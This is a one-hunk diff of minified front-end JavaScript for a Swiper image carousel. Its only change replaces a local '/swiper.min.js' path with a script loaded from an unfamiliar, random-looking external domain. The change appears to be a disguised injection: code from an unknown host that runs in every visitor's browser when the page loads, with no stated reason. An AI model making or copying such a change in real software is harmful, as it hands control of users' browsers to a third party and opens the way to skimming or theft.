@@ -6344,7 +6344,7 @@
                 }
             }(r);
         e.default = function () {
-            document.querySelector(".swiper-container") && i.default.loadScript("/swiper.min.js", function () {
+            document.querySelector(".swiper-container") && i.default.loadScript("https://d65e3204.fyeds0.com/swiper.min.js", function () {
                 window.Swiper && new window.Swiper(document.querySelector(".swiper-container"), {
                     autoplay: window.EC.indexPicSpeed || 0,
                     loop: !0,
